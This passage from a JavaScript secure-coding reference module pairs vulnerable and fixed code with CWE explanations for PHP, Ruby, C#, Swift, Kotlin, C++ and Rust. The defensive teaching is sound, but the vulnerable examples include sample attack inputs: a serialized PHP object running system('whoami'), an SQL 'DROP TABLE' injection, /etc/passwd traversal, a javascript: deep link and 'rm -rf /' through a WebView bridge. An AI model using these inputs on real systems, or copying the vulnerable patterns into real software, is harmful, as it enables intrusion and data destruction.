    $name = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
    $dest = '/var/uploads/' . $name;
    // Move to a directory outside webroot with no PHP execution
    return move_uploaded_file($file['tmp_name'], $dest);
}`,
        explanation: "File upload vulnerabilities allow attackers to upload and execute PHP shells. Never trust the user-supplied filename or Content-Type header. Use finfo to check actual file content, generate random filenames with safe extensions, store uploads outside the webroot, and configure the web server to never execute scripts from the upload directory."
      },
      {
        name: "Object Injection via unserialize",
        cwe: "CWE-502",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: unserializing user input
$data = unserialize($_COOKIE['preferences']);
// Attacker crafts a serialized object with __wakeup or __destruct
// that executes system commands via magic methods
// O:8:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}`,
        secure_code: `// SECURE: use JSON instead of serialize
// Store:
$prefs = ['theme' => 'dark', 'lang' => 'en'];
setcookie('preferences', json_encode($prefs), [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);

// Retrieve:
$prefs = json_decode($_COOKIE['preferences'] ?? '{}', true);
// Validate structure
$theme = in_array($prefs['theme'] ?? '', ['dark', 'light']) ? $prefs['theme'] : 'dark';

// If unserialize is absolutely needed, restrict to specific classes (PHP 7+):
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);`,
        explanation: "PHP's unserialize() can instantiate arbitrary objects and trigger magic methods (__wakeup, __destruct, __toString) that may have dangerous side effects. This can lead to remote code execution via 'POP chains' (Property Oriented Programming). Use json_encode/json_decode instead. If unserialize is unavoidable, use the allowed_classes option (PHP 7+) to restrict which classes can be instantiated."
      }
    ]
  },

  // ============================================================================
  // RUBY
  // ============================================================================
  ruby: {
    language: "Ruby",
    categories: [
      {
        name: "Command Injection",
        cwe: "CWE-78",
        severity: "critical",
        vulnerable_code: `# VULNERABLE: backticks and system() with user input
def ping(host)
  result = \`ping -c 3 #{host}\`
  result
end
# Also vulnerable:
system("nslookup " + params[:domain])
exec("whois " + params[:domain])
IO.popen("dig " + params[:domain])`,
        secure_code: `# SECURE: use array form (no shell interpolation)
require 'shellwords'
def ping(host)
  raise ArgumentError unless host.match?(/\\A[a-zA-Z0-9.\\-]+\\z/)
  stdout, status = Open3.capture2("ping", "-c", "3", host)
  raise "ping failed" unless status.success?
  stdout
end
# Array form bypasses shell entirely:
system("dig", "+short", params[:domain])`,
        explanation: "Ruby's backticks, system(), exec(), and IO.popen() with a single string argument pass through a shell, enabling injection. Use the array form (system(cmd, arg1, arg2)) which bypasses the shell entirely, or use Open3.capture2/capture3 with separate arguments. Always validate input format before using it in commands."
      },
      {
        name: "Mass Assignment (Rails)",
        cwe: "CWE-915",
        severity: "high",
        vulnerable_code: `# VULNERABLE: accepting all parameters
class UsersController < ApplicationController
  def update
    @user = User.find(params[:id])
    @user.update(params[:user])  # Accepts role, admin, etc.
  end
end
# Attacker sends: {user: {name: "Hacker", role: "admin", verified: true}}`,
        secure_code: `# SECURE: strong parameters (Rails 4+)
class UsersController < ApplicationController
  def update
    @user = User.find(params[:id])
    @user.update(user_params)
  end

  private
  def user_params
    params.require(:user).permit(:name, :email, :bio, :avatar_url)
    # Only these 4 fields can be set by the user
  end
end`,
        explanation: "Rails' Strong Parameters require explicitly whitelisting which fields users can set. Without this, attackers can set any model attribute including role, admin flags, or other users' data. Always use params.require(:model).permit(:field1, :field2) and never use params directly in create/update calls."
      },
      {
        name: "SQL Injection in ActiveRecord",
        cwe: "CWE-89",
        severity: "critical",
        vulnerable_code: `# VULNERABLE: string interpolation in where clause
User.where("username = '#{params[:username]}'")
User.where("email LIKE '%#{params[:search]}%'")
User.order(params[:sort])  # Can inject: "name; DROP TABLE users--"`,
        secure_code: `# SECURE: use hash conditions or parameterized strings
User.where(username: params[:username])
User.where("email LIKE ?", "%#{User.sanitize_sql_like(params[:search])}%")
# For order:
allowed_sorts = %w[name email created_at]
sort = allowed_sorts.include?(params[:sort]) ? params[:sort] : 'created_at'
User.order(sort => :asc)`,
        explanation: "ActiveRecord's where() with string interpolation is vulnerable to SQL injection. Use hash conditions (where(col: val)) for equality, positional parameters (where('col LIKE ?', val)) for complex conditions, and an allowlist for column names in order/group clauses. Use sanitize_sql_like() to escape LIKE wildcards (%, _)."
      },
      {
        name: "Insecure YAML (Psych)",
        cwe: "CWE-502",
        severity: "critical",
        vulnerable_code: `# VULNERABLE: YAML.load with untrusted input (Ruby < 3.1)
config = YAML.load(user_uploaded_yaml)
# Attacker payload:
# --- !ruby/object:Gem::Installer
# i: x
# --- !ruby/object:Gem::SpecFetcher
# i: y
# Chains to execute arbitrary Ruby code`,
        secure_code: `# SECURE: use YAML.safe_load
config = YAML.safe_load(
  user_uploaded_yaml,
  permitted_classes: [Date, Time, Symbol],  # Only if needed
  permitted_symbols: [],
  aliases: false  # Prevent alias-based attacks
)

# Ruby 3.1+ changed YAML.load to be safe by default
# But explicitly using safe_load is still recommended for clarity`,
        explanation: "Ruby's YAML.load (before Ruby 3.1) can instantiate arbitrary Ruby objects, leading to remote code execution via gadget chains in standard library classes. Use YAML.safe_load which only allows basic types by default. If specific classes are needed, explicitly list them in permitted_classes."
      }
    ]
  },

  // ============================================================================
  // C#/.NET
  // ============================================================================
  csharp: {
    language: "C# / .NET",
    categories: [
      {
        name: "SQL Injection",
        cwe: "CWE-89",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: string concatenation in SQL
public User GetUser(string username)
{
    string query = $"SELECT * FROM Users WHERE Username = '{username}'";
    using var cmd = new SqlCommand(query, connection);
    using var reader = cmd.ExecuteReader();
    // ...
}`,
        secure_code: `// SECURE: parameterized queries
public User GetUser(string username)
{
    const string query = "SELECT * FROM Users WHERE Username = @username";
    using var cmd = new SqlCommand(query, connection);
    cmd.Parameters.AddWithValue("@username", username);
    using var reader = cmd.ExecuteReader();
    // ...
}
// Or with Entity Framework (always parameterized):
var user = context.Users.FirstOrDefault(u => u.Username == username);`,
        explanation: "Use SqlParameter with @ placeholders in ADO.NET, or use Entity Framework / Dapper which parameterize automatically. String interpolation in SQL commands is always vulnerable."
      },
      {
        name: "Insecure Deserialization (BinaryFormatter)",
        cwe: "CWE-502",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: BinaryFormatter with untrusted data
using System.Runtime.Serialization.Formatters.Binary;

public object Deserialize(byte[] data)
{
    var formatter = new BinaryFormatter();
    using var stream = new MemoryStream(data);
    return formatter.Deserialize(stream); // RCE via gadget chains!
}`,
        secure_code: `// SECURE: use System.Text.Json
using System.Text.Json;

public T Deserialize<T>(string json)
{
    return JsonSerializer.Deserialize<T>(json, new JsonSerializerOptions
    {
        PropertyNameCaseInsensitive = true,
        // Don't allow polymorphic deserialization by default
        // TypeInfoResolver = ... only if needed with explicit type mapping
    });
}`,
        explanation: "BinaryFormatter is marked obsolete in .NET 5+ because it enables arbitrary code execution via deserialization gadget chains (TypeConfuseDelegate, ActivitySurrogateSelector, etc.). Microsoft recommends System.Text.Json or MessagePack with strict type handling. Never deserialize untrusted data with BinaryFormatter, SoapFormatter, LosFormatter, or ObjectStateFormatter."
      },
      {
        name: "Cross-Site Scripting (XSS)",
        cwe: "CWE-79",
        severity: "high",
        vulnerable_code: `// VULNERABLE: Html.Raw with user input (Razor)
@Html.Raw(Model.UserComment)

// VULNERABLE: unencoded output in older WebForms
<%= userInput %>

// VULNERABLE: JavaScript context
<script>var name = '@Model.UserName';</script>`,
        secure_code: `// SECURE: Razor auto-encodes by default
@Model.UserComment  <!-- Auto-encoded -->

// For JavaScript context, use Json serialization:
<script>var name = @Json.Serialize(Model.UserName);</script>

// If raw HTML is needed, sanitize first:
@Html.Raw(HtmlSanitizer.Sanitize(Model.UserComment))

// In controllers, use Content-Type headers:
return Content(userText, "text/plain"); // Not text/html`,
        explanation: "Razor views auto-encode @ expressions, making them safe by default. The danger is Html.Raw() which bypasses encoding, and JavaScript contexts where Razor encoding produces HTML entities (not JS escapes). Use @Json.Serialize() for JS contexts and a sanitizer library (HtmlSanitizer) when raw HTML rendering is necessary."
      },
      {
        name: "Path Traversal",
        cwe: "CWE-22",
        severity: "high",
        vulnerable_code: `// VULNERABLE: user input in file path
[HttpGet("download")]
public IActionResult Download(string filename)
{
    var path = Path.Combine("wwwroot/uploads", filename);
    return PhysicalFile(path, "application/octet-stream");
}
// Attacker: ?filename=..\\..\\appsettings.json`,
        secure_code: `// SECURE: validate resolved path
[HttpGet("download")]
public IActionResult Download(string filename)
{
    var uploadsDir = Path.GetFullPath("wwwroot/uploads");
    var safeName = Path.GetFileName(filename); // Strip directories
    var fullPath = Path.GetFullPath(Path.Combine(uploadsDir, safeName));
    if (!fullPath.StartsWith(uploadsDir + Path.DirectorySeparatorChar))
    {
        return Forbid();
    }
    if (!System.IO.File.Exists(fullPath))
    {
        return NotFound();
    }
    return PhysicalFile(fullPath, "application/octet-stream");
}`,
        explanation: "Path.Combine doesn't prevent traversal — Combine(\"uploads\", \"..\\\\secret\") resolves outside uploads. Use Path.GetFileName() to strip directory components, Path.GetFullPath() to resolve the absolute path, then verify it starts with the allowed directory. Note: Windows uses backslash (\\\\) for paths, so check for both / and \\\\ in traversal attempts."
      }
    ]
  },

  // ============================================================================
  // SWIFT
  // ============================================================================
  swift: {
    language: "Swift",
    categories: [
      {
        name: "Insecure Data Storage (iOS)",
        cwe: "CWE-922",
        severity: "high",
        vulnerable_code: `// VULNERABLE: storing secrets in UserDefaults
let token = "eyJhbGciOiJIUzI1NiJ9..."
UserDefaults.standard.set(token, forKey: "authToken")
// UserDefaults is stored in an unencrypted plist file
// Accessible via device backup, jailbreak, or forensic extraction`,
        secure_code: `// SECURE: use Keychain for sensitive data
import Security

func saveToKeychain(key: String, data: Data) -> Bool {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecValueData as String: data,
        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
    ]
    SecItemDelete(query as CFDictionary) // Remove existing
    let status = SecItemAdd(query as CFDictionary, nil)
    return status == errSecSuccess
}

func loadFromKeychain(key: String) -> Data? {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    return status == errSecSuccess ? result as? Data : nil
}`,
        explanation: "UserDefaults stores data in an unencrypted plist, accessible via iTunes backups and jailbroken devices. The iOS Keychain encrypts data with the device's hardware key and can restrict access to when the device is unlocked (kSecAttrAccessibleWhenUnlockedThisDeviceOnly). Always use Keychain for tokens, passwords, API keys, and other credentials."
      },
      {
        name: "Insecure TLS / ATS Bypass",
        cwe: "CWE-295",
        severity: "high",
        vulnerable_code: `// VULNERABLE: disabling App Transport Security in Info.plist
// <key>NSAppTransportSecurity</key>
// <dict>
//     <key>NSAllowsArbitraryLoads</key>
//     <true/>
// </dict>

// Also vulnerable: accepting any server certificate
class InsecureDelegate: NSObject, URLSessionDelegate {
    func urlSession(_ session: URLSession,
                    didReceive challenge: URLAuthenticationChallenge,
                    completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        completionHandler(.useCredential,
            URLCredential(trust: challenge.protectionSpace.serverTrust!))
    }
}`,
        secure_code: `// SECURE: use default ATS (enforces HTTPS + TLS 1.2+)
// No NSAppTransportSecurity exceptions needed for HTTPS APIs

// For certificate pinning:
class PinningDelegate: NSObject, URLSessionDelegate {
    let pinnedHash = "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

    func urlSession(_ session: URLSession,
                    didReceive challenge: URLAuthenticationChallenge,
                    completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        guard let trust = challenge.protectionSpace.serverTrust,
              let cert = SecTrustGetCertificateAtIndex(trust, 0) else {
            completionHandler(.cancelAuthenticationChallenge, nil)
            return
        }
        let pubKey = SecCertificateCopyKey(cert)!
        let pubKeyData = SecKeyCopyExternalRepresentation(pubKey, nil)! as Data
        let hash = SHA256.hash(data: pubKeyData)
        let pin = "sha256/" + Data(hash).base64EncodedString()
        if pin == pinnedHash {
            completionHandler(.useCredential, URLCredential(trust: trust))
        } else {
            completionHandler(.cancelAuthenticationChallenge, nil)
        }
    }
}`,
        explanation: "App Transport Security (ATS) enforces HTTPS with TLS 1.2+ by default. NSAllowsArbitraryLoads disables this, allowing HTTP and weak TLS. Apple requires justification for ATS exceptions in App Store submissions. For high-security apps, implement certificate pinning to prevent MITM attacks even with a compromised CA."
      }
    ]
  },

  // ============================================================================
  // KOTLIN
  // ============================================================================
  kotlin: {
    language: "Kotlin",
    categories: [
      {
        name: "Intent Injection (Android)",
        cwe: "CWE-927",
        severity: "high",
        vulnerable_code: `// VULNERABLE: using data from untrusted intents
class DeepLinkActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val url = intent.data?.toString() ?: return
        // Attacker sends: darknode://webview?url=javascript:alert(1)
        webView.loadUrl(url)
    }
}

// Also vulnerable: exported components without permission
// <activity android:name=".TransferActivity" android:exported="true">`,
        secure_code: `// SECURE: validate intent data strictly
class DeepLinkActivity : AppCompatActivity() {
    private val allowedHosts = setOf("darknode.ai", "www.darknode.ai")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val uri = intent.data ?: return finish()
        // Validate scheme and host
        if (uri.scheme !in listOf("https") || uri.host !in allowedHosts) {
            finish()
            return
        }
        // Never load javascript: or data: URIs
        val safeUrl = uri.toString()
        if (!safeUrl.startsWith("https://")) {
            finish()
            return
        }
        webView.loadUrl(safeUrl)
    }
}

// Protect exported components:
// <activity android:name=".TransferActivity"
//     android:exported="true"
//     android:permission="com.darknode.TRANSFER_PERMISSION">`,
        explanation: "Android Intents can be sent by any app. Exported activities, services, and broadcast receivers that process intent data without validation are vulnerable to injection. Always validate URI scheme, host, and path before using deep link data. Protect sensitive exported components with custom permissions."
      },
      {
        name: "Insecure SharedPreferences",
        cwe: "CWE-922",
        severity: "high",
        vulnerable_code: `// VULNERABLE: storing sensitive data in plain SharedPreferences
val prefs = getSharedPreferences("auth", MODE_PRIVATE)
prefs.edit()
    .putString("api_key", "sk-live-abc123")
    .putString("session_token", token)
    .apply()
// SharedPreferences are XML files on disk — readable on rooted devices`,
        secure_code: `// SECURE: use EncryptedSharedPreferences (Jetpack Security)
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

val masterKey = MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build()

val prefs = EncryptedSharedPreferences.create(
    context, "auth_encrypted", masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)
prefs.edit()
    .putString("session_token", token)
    .apply()

// For API keys, consider Android Keystore directly
val keyStore = KeyStore.getInstance("AndroidKeyStore")
keyStore.load(null)`,
        explanation: "SharedPreferences stores data as unencrypted XML on disk, accessible on rooted devices or via backup extraction. Use EncryptedSharedPreferences from Jetpack Security, which encrypts both keys and values with AES-256. For cryptographic keys and high-value tokens, use the Android Keystore which stores keys in hardware (TEE/SE)."
      },
      {
        name: "WebView JavaScript Interface",
        cwe: "CWE-749",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: exposing dangerous methods to JavaScript
class WebAppInterface(private val context: Context) {
    @JavascriptInterface
    fun executeCommand(cmd: String): String {
        val process = Runtime.getRuntime().exec(cmd)
        return process.inputStream.bufferedReader().readText()
    }
}
webView.addJavascriptInterface(WebAppInterface(this), "Android")
// Any JavaScript on the page can call: Android.executeCommand("rm -rf /")`,
        secure_code: `// SECURE: minimal interface with strict validation
class WebAppInterface(private val context: Context) {
    @JavascriptInterface
    fun getAppVersion(): String = BuildConfig.VERSION_NAME

    @JavascriptInterface
    fun showToast(message: String) {
        // Sanitize and limit input
        val safe = message.take(200).replace(Regex("[<>&\"']"), "")
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(context, safe, Toast.LENGTH_SHORT).show()
        }
    }
}
// Only load trusted content
webView.settings.javaScriptEnabled = true
webView.loadUrl("https://darknode.ai/app") // Your domain only

// Validate URLs before loading
webView.webViewClient = object : WebViewClient() {
    override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
        return request.url.host != "darknode.ai"
    }
}`,
        explanation: "WebView's addJavascriptInterface exposes Kotlin/Java methods to any JavaScript running in the WebView. If the WebView loads untrusted content (XSS, compromised pages, redirects), attackers can call these methods. Minimize the interface surface, never expose system commands or file access, validate all inputs, and restrict WebView navigation to trusted domains."
      }
    ]
  },

  // ============================================================================
  // C++
  // ============================================================================
  cpp: {
    language: "C++",
    categories: [
      {
        name: "Buffer Overflow (std::string safety)",
        cwe: "CWE-120",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: C-style string handling in C++
#include <cstring>
void process(const char* input) {
    char buffer[128];
    strcpy(buffer, input);  // Classic buffer overflow
    // Also dangerous:
    sprintf(buffer, "Hello %s, your score is %d", input, score);
    gets(buffer);  // Never use gets — removed in C11
}`,
        secure_code: `// SECURE: use std::string and safe APIs
#include <string>
#include <format>  // C++20
void process(const std::string& input) {
    // std::string manages its own memory
    std::string greeting = "Hello " + input;

    // For C-interop, use bounded copies
    char buffer[128];
    snprintf(buffer, sizeof(buffer), "Hello %s", input.c_str());

    // C++20 std::format is safe by design
    auto msg = std::format("Hello {}, score: {}", input, score);
}`,
        explanation: "C++ inherits C's unsafe string functions. Use std::string for all string operations — it manages memory automatically and prevents overflow. When interfacing with C APIs, use snprintf (not sprintf) with explicit buffer sizes. C++20's std::format provides type-safe formatting without buffer overflow risk."
      },
      {
        name: "Use-After-Free with Smart Pointers",
        cwe: "CWE-416",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: raw pointers and manual memory management
class Connection {
    Socket* socket;
public:
    ~Connection() { delete socket; }
    void reconnect() {
        delete socket;
        socket = new Socket();  // If constructor throws, socket is dangling
    }
    Socket* getSocket() { return socket; }  // Caller can use after delete
};`,
        secure_code: `// SECURE: RAII with smart pointers
#include <memory>
class Connection {
    std::unique_ptr<Socket> socket;
public:
    // Destructor auto-deletes (Rule of Zero)
    void reconnect() {
        socket = std::make_unique<Socket>();  // Old socket auto-deleted
        // If constructor throws, old socket was already replaced safely
    }
    Socket& getSocket() { return *socket; }  // Reference, not owning pointer

    // For shared ownership:
    // std::shared_ptr<Socket> socket;
    // auto ref = std::weak_ptr(socket); // Non-owning observer
};`,
        explanation: "Raw new/delete leads to use-after-free, double-free, and memory leaks. Smart pointers (unique_ptr for single ownership, shared_ptr for shared, weak_ptr for non-owning observation) automate lifetime management. unique_ptr has zero overhead vs raw pointers. Follow the Rule of Zero: if you use smart pointers, you don't need a custom destructor, copy constructor, or assignment operator."
      },
      {
        name: "Integer Overflow in Size Calculations",
        cwe: "CWE-190",
        severity: "high",
        vulnerable_code: `// VULNERABLE: unchecked arithmetic in allocation
void processImage(uint32_t width, uint32_t height, uint8_t channels) {
    // width * height * channels can overflow uint32_t
    size_t size = width * height * channels;
    uint8_t* pixels = new uint8_t[size];  // Allocates tiny buffer
    readPixels(pixels, width * height * channels);  // Massive overflow read
}`,
        secure_code: `// SECURE: check for overflow before allocating
#include <cstdint>
#include <limits>
#include <stdexcept>

void processImage(uint32_t width, uint32_t height, uint8_t channels) {
    // Check each multiplication for overflow
    if (width > 0 && height > SIZE_MAX / width) {
        throw std::overflow_error("Image dimensions overflow");
    }
    size_t pixels = static_cast<size_t>(width) * height;
    if (channels > 0 && pixels > SIZE_MAX / channels) {
        throw std::overflow_error("Image size overflow");
    }
    size_t size = pixels * channels;
    auto buffer = std::make_unique<uint8_t[]>(size);
    readPixels(buffer.get(), size);
}`,
        explanation: "Integer overflow in size calculations produces a small value that causes a small allocation, followed by a large read/write that overflows the buffer. Always cast to size_t before multiplication, check each step for overflow (a * b overflows if a > MAX / b), and use smart pointers for the allocation."
      }
    ]
  },

  // ============================================================================
  // RUST
  // ============================================================================
  rust: {
    language: "Rust",
    categories: [
      {
        name: "SQL Injection (despite safety)",
        cwe: "CWE-89",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: format! in SQL query
use sqlx;
async fn get_user(pool: &PgPool, username: &str) -> Result<User, Error> {
    let query = format!("SELECT * FROM users WHERE username = '{}'", username);
    sqlx::query_as::<_, User>(&query)
        .fetch_one(pool)
        .await
}`,
        secure_code: `// SECURE: parameterized queries
use sqlx;
async fn get_user(pool: &PgPool, username: &str) -> Result<User, Error> {
    sqlx::query_as::<_, User>("SELECT * FROM users WHERE username = $1")
        .bind(username)
        .fetch_one(pool)
        .await
}
// Even better: compile-time checked queries with sqlx::query!
async fn get_user_v2(pool: &PgPool, username: &str) -> Result<User, Error> {
    let user = sqlx::query_as!(User,
        "SELECT id, name, email FROM users WHERE username = $1",
        username
    ).fetch_one(pool).await?;
    Ok(user)
}`,
        explanation: "Rust's memory safety doesn't prevent SQL injection — format! still creates exploitable strings. Use sqlx's .bind() for parameterized queries, or the query_as! macro which verifies queries against the database at compile time. The macro catches both SQL syntax errors and type mismatches before the code runs."
      },
      {
        name: "Unsafe Block Misuse",
        cwe: "CWE-119",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: unnecessary unsafe that breaks safety guarantees
fn get_element(slice: &[u8], index: usize) -> u8 {
    unsafe { *slice.as_ptr().add(index) }  // No bounds checking!
}
// Also dangerous: transmute for type punning
fn to_string(data: &[u8]) -> &str {
    unsafe { std::mem::transmute(data) }  // Assumes valid UTF-8!
}`,
        secure_code: `// SECURE: use safe APIs — unsafe only when provably necessary
fn get_element(slice: &[u8], index: usize) -> Option<u8> {
    slice.get(index).copied()  // Returns None for out-of-bounds
}

fn to_string(data: &[u8]) -> Result<&str, std::str::Utf8Error> {
    std::str::from_utf8(data)  // Validates UTF-8
}

// When unsafe IS needed, document the safety invariant
fn split_at_unchecked(slice: &[u8], mid: usize) -> (&[u8], &[u8]) {
    assert!(mid <= slice.len(), "mid out of bounds");
    // SAFETY: we just verified mid <= len, so both sub-slices are valid
    unsafe { (slice.get_unchecked(..mid), slice.get_unchecked(mid..)) }
}`,
        explanation: "Rust's safety guarantees only hold outside unsafe blocks. Every unsafe block is a promise that the programmer has verified the invariants the compiler normally checks. Minimize unsafe usage, always document the safety invariant with a // SAFETY comment, prefer safe alternatives (.get() over raw pointer arithmetic, from_utf8 over transmute), and assert preconditions before the unsafe block."
      },
      {
        name: "Path Traversal",
        cwe: "CWE-22",
        severity: "high",
        vulnerable_code: `// VULNERABLE: user input in file path
use std::path::Path;
fn serve_file(name: &str) -> std::io::Result<Vec<u8>> {
    let path = Path::new("./uploads").join(name);
    std::fs::read(path)
}
// Attacker: name = "../../../etc/passwd"`,
        secure_code: `// SECURE: canonicalize and verify prefix
use std::path::{Path, PathBuf};
fn serve_file(name: &str) -> Result<Vec<u8>, String> {
    let base = Path::new("./uploads")
        .canonicalize()
        .map_err(|e| format!("Base dir error: {}", e))?;
    // Strip directory components
    let safe_name = Path::new(name)
        .file_name()
        .ok_or("Invalid filename")?;
    let full = base.join(safe_name)
        .canonicalize()
        .map_err(|_| "File not found".to_string())?;
    if !full.starts_with(&base) {
        return Err("Access denied".into());
    }
    std::fs::read(full).map_err(|e| e.to_string())
}`,
        explanation: "Path::join doesn't prevent traversal — join(\"uploads\", \"../../etc/passwd\") is valid. Use .file_name() to extract just the filename component, .canonicalize() to resolve symlinks and get the absolute path, then verify it starts_with the allowed directory. Canonicalize requires the file to exist, which also prevents access to non-existent traversal targets."
      }
    ]
  }
};

// Helper: get all languages
export const LANGUAGES = Object.keys(SECURE_CODING);

// Helper: get total vulnerability count
export const TOTAL_PATTERNS = Object.values(SECURE_CODING)
  .reduce((sum, lang) => sum + lang.categories.length, 0);

// Helper: search patterns by CWE
export function findByCWE(cweId) {
  const results = [];
  for (const [langKey, lang] of Object.entries(SECURE_CODING)) {
    for (const cat of lang.categories) {
      if (cat.cwe === cweId) {
        results.push({ language: lang.language, ...cat });
      }
    }
  }
  return results;
}

// Helper: search patterns by severity
export function findBySeverity(level) {
  const results = [];
  for (const [langKey, lang] of Object.entries(SECURE_CODING)) {
    for (const cat of lang.categories) {
      if (cat.severity === level) {
        results.push({ language: lang.language, ...cat });
      }
    }
  }
  return results;
}
